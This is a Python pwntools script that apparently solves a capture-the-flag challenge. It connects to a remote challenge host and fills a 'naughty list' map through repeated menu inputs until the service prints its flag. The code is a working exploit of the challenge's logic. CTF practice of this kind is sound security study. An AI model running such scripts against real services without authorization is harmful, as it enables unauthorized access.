#!/usr/bin/env python3

from pwn import *


#context.log_level = "DEBUG"

def main():
	r = remote("challs.htsp.ro", 8002)
	log.info("Stuffing in 15 items to get the supposedly \"filled\" map")
	for i in range(15):
		r.sendlineafter(b"3. Add to naughty list", b"3")
		r.sendlineafter(b"Name:", bytes(str(i + 2), 'utf-8'))
	resp = b""
	i = 17
	while (not b"flag!" in resp):
		log.info(f"Number of items in map: {i}")
		r.sendlineafter(b"3. Add to naughty list", b"2")
		r.sendlineafter(b"Name:", bytes(str(i), 'utf-8'))
		r.sendlineafter(b"3. Add to naughty list", b"1")
		r.recvline()
		resp = r.recvline()
		#log.info(resp.decode())
		if (b"flag!" in resp):
			log.info(f"Exploit worked! Flag: {r.recvline().decode()}")
		i += 1
	r.close()

if __name__ == "__main__":
	main()
